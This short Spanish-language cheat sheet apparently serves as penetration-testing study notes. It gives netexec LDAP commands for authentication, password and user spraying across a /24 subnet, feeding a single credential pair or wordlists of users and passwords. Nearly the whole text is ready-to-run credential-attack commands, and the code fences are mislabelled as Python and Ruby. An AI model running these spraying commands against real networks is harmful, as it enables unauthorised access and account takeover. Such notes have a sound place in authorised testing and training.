### Authentication Spraying

Esta es una tecnica en la que si tenemos un usuario y una contraseña, podemos pasar esas credenciales en todas las maquinas de la red, para así saber en cuales puedes entrar:

```python
netexec ldap 192.168.45.0/24 -u '{Usuario}' -p '{Contraseña}' 
```

### Password Spraying

```python
netexec ldap 192.168.45.0/24 -u '{Usuario}' -p contraseñas.txt
```


### Password and user Spraying

```ruby
netexec ldap 192.168.45.0/24 -u users.txt -p contraseñas.txt
```

